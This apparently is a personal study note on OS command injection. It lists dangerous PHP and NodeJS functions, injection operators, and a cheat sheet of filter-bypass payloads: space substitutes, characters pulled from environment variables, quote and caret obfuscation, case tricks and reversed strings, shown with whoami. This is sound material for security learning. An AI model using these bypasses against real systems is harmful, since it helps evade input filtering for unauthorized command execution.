Many web applications execute local Operating System commands to perform certain processes. For example, a web application may install a plugin of our choosing by executing an OS command that downloads that plugin, using the plugin name provided. If not properly filtered and sanitized, attackers may be able to inject another command to be executed alongside the originally intended command (i.e., as the plugin name), which allows them to directly execute commands on the back end server and gain control over it. This type of vulnerability is called [command injection](https://owasp.org/www-community/attacks/Command_Injection).

This vulnerability is widespread, as developers may not properly sanitize user input or use weak tests to do so, allowing attackers to bypass any checks or filtering put in place and execute their commands.

For example, the WordPress Plugin `Plainview Activity Monitor 20161228` has a [vulnerability](https://www.exploit-db.com/exploits/45274) that allows attackers to inject their command in the `ip` value, by simply adding `| COMMAND...` after the `ip` value.

##### PHP
#php
`exec`, `system`, `shell_exec`, `passthru`, or `popen`

`call_user_func_array` - can be vunerable through system PHP function

##### NodeJS
[[js]] #nodejs
`child_process.exec` or `child_process.spawn` 

#### Operators:
```
%0a - new line
&
&&
|
||
;
```
#### Inline command execution
```bash
`whoami`
```
or
```bash
$(whoami)
```


#encoding
##### Bypass spaces:
* `%09` - tab char
* `${IFS}` - variable of space and tab
* `{ls,-la}` - brace expansion
* Replace space with + or %2b

###### Bypass /; blacklisted:
```shell
echo ${PATH:0:1}
/

echo ${LS_COLORS:10:1}
;
```

```powershell
C:\htb> echo %HOMEPATH:~6,-11%
\

$env:HOMEPATH[0]
\

PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>

```


Shifting
```shell
man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<[)

\
```

##### Bypass blacklisted commands
linux & win:
```shell
21y4d@htb[/htb]$ w'h'o'am'i

21y4d

21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

only linux:
```bash
w\ho\am\i

who$@ami
```

windows only:
```powershell
C:\htb> who^ami
```

##### Case manipulation
#encoding
```shell
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

Reverse string:
```shell
$(rev<<<'imaohw')
```

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
```
